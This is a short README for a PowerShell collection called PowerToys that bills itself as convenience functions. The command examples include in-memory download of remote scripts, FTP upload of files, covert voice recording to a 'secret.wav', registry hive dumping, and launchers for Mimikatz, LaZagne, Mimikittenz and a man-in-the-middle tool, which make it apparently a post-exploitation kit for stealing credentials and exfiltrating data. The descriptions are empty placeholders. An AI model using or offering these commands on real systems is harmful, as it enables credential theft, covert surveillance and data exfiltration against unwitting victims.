# PowerToys v1.0
PowerToys is a powershell collection of userfull functions like ftp upload, download functions, run in memory, unzip functions, etc. It is distributed under the GNU GPLv3 license.
## List of tools
### Download
Example desc.
```
Download -url "https://example.com/file.txt" -outfile "c:\windows\temp\file.txt"
```
### DownloadString
Example desc.
```
DownloadString -url "http://example.com/a.ps1" 
```
### Unzip
Example desc.
```
Unzip -zipfile "myzip.zip" -path "c:\windows\temp"
```
### #UploadFtp
Example desc.
```
UploadFtp -address "192.168.0.1" -username "username" -password "password" -pathFileName "/folder/file.txt" -uploadfile "file.txt"
```
### RunVoiceRecord
Example desc.
```
RunVoiceRecord -fullPathOutput "C:\windows\temp\secret.wav" -seconds 120
```
### DumpHives
Example desc.
```
DumpHives -dumpfolder "C:/windows/temp"
```
### RunMitmp
Example desc.
```
RunMitmp
```
### RunLazagne
Example desc.
```
RunLazagne
```
### RunMimikatz
Example desc.
```
RunMimikatz
```
### RunMimikittenz
Example desc.
```
RunMimikittenz
```
